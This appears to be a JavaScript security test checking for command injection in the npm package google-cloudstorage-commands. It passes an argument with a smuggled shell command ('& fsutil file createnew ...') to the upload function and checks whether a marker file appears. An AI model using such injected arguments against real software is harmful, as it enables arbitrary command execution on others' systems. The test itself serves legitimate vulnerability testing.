// test("Command Injection in google-cloudstorage-commands", () => {
//   expect.assertions(2);
  var root = require("google-cloudstorage-commands");
  const fs = require("fs");
  const path = "./google-cloudstorage-commands";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  console.log(root
    .upload("./", "& fsutil file createnew google-cloudstorage-commands 0", true)
    .finally(() => {
      file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
      fs.unlink(path, function (err) {});
    }));
// });
